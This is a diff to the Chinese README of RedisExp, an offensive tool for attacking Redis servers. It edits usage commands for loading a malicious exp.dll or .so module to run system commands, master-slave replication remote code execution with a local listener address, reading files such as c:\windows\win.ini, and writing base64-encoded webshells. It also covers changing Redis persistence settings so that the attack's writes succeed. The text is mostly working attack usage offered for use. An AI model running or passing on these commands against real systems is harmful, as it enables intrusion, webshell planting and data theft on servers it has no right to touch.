@@ -33,7 +33,7 @@ RedisExp.exe -m cli -r 192.168.19.1 -p 6379 -w 123456 -c info
 
 加载dll或so执行命令：
 RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf (目标 dll | so 文件名)
-.\RedisEXP.exe -m rce -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec
+.\RedisEXP.exe -m load -r 127.0.0.1 -p 6379 -rf exp.dll -n system -t system.exec
 
 主从复制命令执行：
 RedisExp.exe -m rce -r 目标IP -p 目标端口 -w 密码 -L 本地IP -P 本地Port [-c whoami 单次执行] -rf 目标文件名[exp.dll | exp.so (Linux)]
@@ -84,11 +84,16 @@ RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf c:\windows\win.ini
 config set rdbcompression no
 ```
 
+`stop-writes-on-bgsave-error` 默认为 `yes`, 也就是如果 Redis 开启了 RDB 持久化并且最后一次失败了，Redis 默认会停止写入，让用户意识到数据的持久化没有正常工作。链接里面提供的解决方案是 `conf set stop-writes-on-bgsave-error` 设置为 no，只是让程序暂时忽略了这个问题，但是数据的持久化的问题并没有。（工具会默认设置为 `no` ，等工具退出的时候再重新设置回原来的值`yes`）
 
-1. 具体命令使用 -h 来查看
-2. exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。
-4. 在写入webshell的时候因为有一些特殊字符，可以使用把webshell进行 base64 编码，然后使用 -b 参数来解码
-4. 有空格的目录或文件同时使用双引号和单引号  `"'a b'"` 
+```
+config set stop-writes-on-bgsave-error no
+```
+
+
+1. exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。
+2. 在写入webshell的时候因为有一些特殊字符，可以使用把webshell进行 base64 编码，然后使用 -b 参数来解码
+3. 有空格的目录或文件同时使用双引号和单引号  `"'a b'"` 
 
 
 
